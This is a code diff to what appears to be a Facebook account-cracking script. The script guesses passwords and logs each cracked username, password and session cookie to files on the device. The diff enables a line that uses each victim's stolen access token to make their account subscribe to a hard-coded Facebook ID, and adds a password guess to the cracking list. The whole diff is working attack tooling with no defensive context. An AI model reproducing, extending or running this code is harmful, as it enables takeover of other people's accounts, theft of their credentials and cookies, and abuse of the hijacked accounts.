@@ -907,12 +907,12 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {coki} {VV} 			   ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        #foll#ow_id='100000160984736'
-                        #subs = requests.post#('https://graph.facebook.com/'+f#ollow_id+'/subscribers?access_token='+to#kic, cookies={#'cookie':cokie}).te#xt
+                        follow_id='100000160984736'
+                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -973,11 +973,11 @@ class crack:
         for x in r.find_all("a",href=True):
             if "/a/subscribe.php" in x.get('href'):
                 session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        if '/a/subscribe.php' in str(r):
-            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        else:
-            pass
+        #if '/a/subscribe.php' in str(r):
+            #b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            #session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        #else:
+            #pass
 
     def cek_cp(self,user,pw):
         global ok,cp,f2
@@ -1237,7 +1237,7 @@ class crack:
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
             if pas == '1':
-                pwz=['number']
+                pwz=['number', '57273200']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
             elif pas == '2':
